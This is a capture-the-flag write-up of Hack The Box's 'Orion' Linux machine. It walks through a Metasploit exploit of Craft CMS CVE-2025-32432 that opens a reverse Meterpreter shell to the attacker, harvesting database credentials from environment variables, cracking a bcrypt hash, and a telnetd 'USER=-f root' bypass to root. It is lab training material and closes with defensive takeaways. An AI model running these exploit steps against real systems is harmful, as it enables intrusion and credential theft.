# HTB Write-Up: Orion

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Orion)                |
| Difficulty | Easy                                                                     |
| OS         | Linux                                                                    |
| Author     | Babayev                                                                   |
| Date       | June 23, 2026                                                            |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Directory Fuzzing & Craft CMS Discovery](#2-enumeration--web-directory-fuzzing--craft-cms-discovery)
3. [Initial Access — CVE-2025-32432 Craft CMS Preauth RCE](#3-initial-access--cve-2025-32432-craft-cms-preauth-rce)
4. [Lateral Movement — Database Credentials & Password Cracking](#4-lateral-movement--database-credentials--password-cracking)
5. [Privilege Escalation — Telnetd Authentication Bypass](#5-privilege-escalation--telnetd-authentication-bypass)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.244.146 --ulimit 5000
```

**Open Ports:**

| Port | Service | Version                                              |
|------|---------|-------------------------------------------------------|
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux)       |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu)                                 |

A follow-up service/version scan confirmed the host as an **Ubuntu 22.04** target running **nginx**, with the HTTP title resolving to **"Orion Telecom"**:

```bash
nmap -sC -sV -p22,80 10.129.244.146
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Orion Telecom
```

The target was added to `/etc/hosts` as `orion.htb` and the web application was explored next.

---

## 2. Enumeration — Web Directory Fuzzing & Craft CMS Discovery

### 2.1 — Directory Fuzzing

Content discovery was performed with **ffuf** against the web root:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://orion.htb/FUZZ
```

**Notable results:**

```
admin                   [Status: 302, Size: 0,     Words: 1,    Lines: 1,   Duration: 186ms]
assets                  [Status: 301, Size: 178,   Words: 6,    Lines: 8,   Duration: 77ms]
index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 354ms]
logout                  [Status: 302, Size: 0,     Words: 1,    Lines: 1,   Duration: 162ms]
```

The `/admin` endpoint redirected to a login page, and the presence of `index.php` alongside `logout` strongly suggested a PHP-based CMS backend rather than a static site.

### 2.2 — CMS Fingerprinting

Visiting `/admin/login` revealed the application as **Craft CMS**, with the version exposed directly on the login page:

```
Craft CMS 5.6.16
```

Craft CMS 5.6.16 is vulnerable to a known **pre-authentication remote code execution** flaw, making it the clear path forward rather than attempting credential attacks against the admin panel.

---

## 3. Initial Access — CVE-2025-32432 Craft CMS Preauth RCE

### 3.1 — Identifying the Exploit Module

**Metasploit** was used to search for and load the matching exploit:

```bash
msf6 > search 2025-32432
```

```
0  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14  excellent  Yes  Craft CMS Image Transform Preauth RCE (CVE-2025-32432)
```

This module targets Craft CMS's asset/image transform handling, allowing unauthenticated remote code execution via a crafted asset transform request — no credentials required.

### 3.2 — Configuring and Running the Exploit

```bash
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost tun0
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts 10.129.244.146
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lport 1337
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set vhost orion.htb
msf6 exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
```

**Output:**

```
[*] Started reverse TCP handler on 10.10.15.24:1337
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Meterpreter session 1 opened (10.10.15.24:1337 -> 10.129.244.146:40156)
```

A **Meterpreter** session was established, and a standard shell was dropped from it as the low-privileged web service account:

```bash
meterpreter > shell
```

```
www-data@orion:~/html/craft/config$
```

---

## 4. Lateral Movement — Database Credentials & Password Cracking

### 4.1 — Harvesting Craft CMS Environment Secrets

Craft CMS stores its database credentials in environment variables, readable directly from the `www-data` shell:

```bash
www-data@orion:~/html/craft/config$ env
```

**Key values:**

| Variable             | Value                          |
|-----------------------|---------------------------------|
| `CRAFT_DB_DATABASE`   | `orion`                         |
| `CRAFT_DB_DRIVER`     | `mysql`                         |
| `CRAFT_DB_SERVER`     | `127.0.0.1`                      |
| `CRAFT_DB_USER`       | `root`                           |
| `CRAFT_DB_PASSWORD`   | `SuperSecureCraft123Pass!`       |

The application was running in `CRAFT_DEV_MODE=true` with `CRAFT_ALLOW_ADMIN_CHANGES=true`, but the database root credentials embedded in the environment provided a much more direct route.

### 4.2 — Dumping the Users Table

The leaked credentials granted **root access to the local MariaDB instance**:

```bash
mysql -u root -p
# Password: SuperSecureCraft123Pass!
```

```sql
MariaDB [orion]> select * from users;
```

**Result (relevant columns):**

| username | email          | password (bcrypt hash)                                          |
|----------|----------------|-------------------------------------------------------------------|
| admin    | adam@orion.htb | `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`     |

### 4.3 — Cracking the Admin Hash

The bcrypt hash was extracted and cracked offline with **John the Ripper**:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**

```
darkangel        (?)
1g 0:00:00:21 DONE
Session completed.
```

The cracked credential mapped to the Craft CMS admin account's email, `adam@orion.htb`, which matched a valid Linux system user — `adam`.

### 4.4 — SSH Access & User Flag

```bash
ssh adam@orion.htb
# Password: darkangel
```

```
adam@orion:~$ cat user.txt
3ebe7b87d1aced3644e36d460c7241e3
```

**User flag retrieved** from `/home/adam/user.txt`.

---

## 5. Privilege Escalation — Telnetd Authentication Bypass

### 5.1 — Identifying the Local Telnet Service

A listening-socket review as `adam` revealed an internal-only **telnet** service bound to loopback:

```bash
adam@orion:/tmp$ ss -tulnp
```

```
tcp  LISTEN  0  10  127.0.0.1:23  0.0.0.0:*  users:(("inetutils-inetd",pid=1008,fd=4))
```

Checking the installed client version showed it was **GNU inetutils telnet 2.7**:

```bash
adam@orion:/tmp$ telnet --version
```

```
telnet (GNU inetutils) 2.7
```

This version is associated with a known **authentication bypass** affecting `inetutils-telnetd`: the `inetd`-spawned `telnetd` trusts a client-supplied `USER` environment variable when negotiating the `telnet` `ENVIRON`/`AUTHENTICATION` options, and under certain configurations this can be abused to log in as an arbitrary user — including `root` — without a password.

### 5.2 — Exploiting the Bypass

The `USER` environment variable was set to request a `root` login (`-f root`) before connecting to the local telnet service:

```bash
adam@orion:/tmp$ USER="-f root" telnet -a 127.0.0.1
```

**Output:**

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/3)
```

The `-a` flag instructs the telnet client to attempt automatic login using the `USER` variable, and the vulnerable `telnetd` honored it directly — dropping straight into a **root shell** with no password prompt.

### 5.3 — Root Flag

```bash
root@orion:~# cd /root
root@orion:~# cat root.txt
f6dbb29265783535e3c32a47d15fb2db
```

**Root flag retrieved from `/root/root.txt`.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | Ubuntu 22.04 host identified; SSH and nginx exposed; site titled "Orion Telecom" |
| Enumeration | ffuf directory fuzzing | `/admin` login panel discovered; Craft CMS 5.6.16 fingerprinted |
| Initial Access | Metasploit — CVE-2025-32432 | Preauth RCE in Craft CMS image transform handling; Meterpreter shell as `www-data` |
| Credential Theft | `env` on compromised shell | Craft CMS DB root credentials leaked via environment variables |
| Lateral Movement | MariaDB root access | `users` table dumped; admin bcrypt hash extracted |
| Password Cracking | John the Ripper + rockyou.txt | Hash cracked to `darkangel`; mapped to system user `adam` |
| User Flag | SSH as `adam` | `user.txt` from `/home/adam` |
| Privilege Escalation | `inetutils-telnetd` `USER` env auth bypass | Root telnet session via `USER="-f root" telnet -a 127.0.0.1` |
| Root | Local telnet root shell | `root.txt` from `/root` |

### Key Takeaways

- **Unauthenticated RCEs in CMS platforms remain a top initial-access vector.** Craft CMS 5.6.16's image transform handling allowed full preauth code execution before any credential attack was even necessary. Patch cadence on internet-facing CMS instances should be treated as a critical control, not a backlog item.

- **Environment variables are not a safe place for production secrets.** The Craft CMS database root password was trivially readable via `env` from the web service account's shell. Secrets management (vaults, scoped service accounts, least-privilege DB users) would have stopped the lateral movement here entirely — a compromised web app should never have a path to database root.

- **Application-layer compromise often leaks reusable credentials.** The cracked Craft CMS admin password doubled as the local Linux user's SSH password. Password reuse between application accounts and system accounts collapses what should be two separate security boundaries into one.

- **Legacy services bound to loopback are not inherently safe.** The `inetutils-telnetd` instance was only reachable from `127.0.0.1`, but that didn't matter once a local foothold was established. A trust-the-client `USER` environment variable in the `telnet`/`AUTHENTICATION` option negotiation turned a "local-only" service into an instant root shell. Deprecated protocols like telnet should be removed entirely rather than firewalled to localhost and assumed safe.
